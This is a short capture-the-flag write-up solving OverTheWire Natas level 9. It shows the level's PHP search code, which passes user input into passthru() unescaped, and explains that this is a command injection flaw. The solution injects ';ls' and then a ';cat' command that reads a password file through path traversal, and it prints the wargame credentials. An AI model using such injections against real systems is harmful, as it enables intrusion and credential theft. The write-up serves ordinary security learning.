# Natas Level 9

> Username: natas9
> Password: UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9
> URL: http://natas9.natas.labs.overthewire.org

## Solution

Entering the URL we found a search. Viewing the source code behind it we found:

```js
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

This code contains a Command Injection vulnerability because it passes user-supplied input `$_REQUEST["needle"]` directly into a system shell via the passthru() function without any sanitization or escaping.

If we try to search with `;ls` we get `dictionary.txt` so it works.

Now let's search for the next user password with:

```shell
;cat ../../../../../etc/natas_webpass/natas10
```

```text
EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```

